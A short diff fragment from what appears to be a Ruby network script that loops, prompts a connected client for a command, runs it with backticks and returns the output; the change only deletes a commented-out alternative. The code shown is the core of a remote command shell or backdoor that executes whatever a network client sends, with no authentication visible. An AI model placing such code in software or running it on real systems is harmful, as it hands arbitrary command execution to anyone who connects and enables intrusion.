@@ -10,7 +10,6 @@ loop do
 	client.puts "\n\nCommand to excute: \n\n"
 	cmd = client.gets.chomp
 	client.close if cmd == "exit"
-	#output = system ( "#{cmd}" )
 	output = `#{cmd}`
 	client.puts output
 	#client.close
